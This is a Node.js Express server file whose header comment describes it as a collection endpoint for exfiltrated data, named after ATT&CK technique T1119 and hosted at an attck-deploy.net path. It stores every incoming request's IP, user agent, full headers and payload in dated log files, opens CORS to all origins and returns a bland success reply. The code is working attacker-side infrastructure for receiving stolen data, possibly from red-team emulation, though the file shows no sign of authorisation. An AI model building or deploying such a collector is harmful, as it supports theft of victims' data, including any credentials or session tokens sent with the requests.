/**
 * Data Collection Server
 * 
 * This server receives and processes exfiltrated data sent to the
 * https://attck-deploy.net/attcks/T1119/collect endpoint.
 * 
 * It operates independently from the Cloudflare worker and provides
 * direct data collection capabilities.
 */

const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const morgan = require('morgan');

// Initialize Express app
const app = express();
const PORT = process.env.PORT || 3000;

// Create logs directory if it doesn't exist
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir, { recursive: true });
}

// Configure logging
const accessLogStream = fs.createWriteStream(
  path.join(logsDir, 'access.log'), 
  { flags: 'a' }
);

// Middleware
app.use(morgan('combined', { stream: accessLogStream }));
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));

// Enable CORS for all routes
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Data collection endpoint
app.post('/attcks/T1119/collect', (req, res) => {
  const timestamp = new Date().toISOString();
  const clientIP = req.ip || req.connection.remoteAddress;
  const userAgent = req.get('User-Agent') || 'Unknown';
  
  // Extract data from request body
  const payload = req.body;
  
  // Create record with metadata
  const record = {
    timestamp,
    clientIP,
    userAgent,
    headers: req.headers,
    payload
  };
  
  // Log the data
  const logFilename = path.join(logsDir, `data_${timestamp.split('T')[0].replace(/-/g, '')}.json`);
  
  fs.appendFile(
    logFilename,
    JSON.stringify(record) + '\n',
    err => {
      if (err) {
        console.error('Error writing to log file:', err);
      }
    }
  );
  
  // Log to console (for debugging)
  console.log(`[${timestamp}] Data received from ${clientIP}`);
  
  // Send a success response without revealing server details
  res.status(200).json({ status: 'success' });
});

// Optional health check endpoint
app.get('/attcks/T1119/health', (req, res) => {
  res.status(200).json({ status: 'up' });
});

// Fallback route
app.use('*', (req, res) => {
  res.status(404).json({ error: 'Not found' });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Collection server running on port ${PORT}`);
});

module.exports = app; // For testing purposes
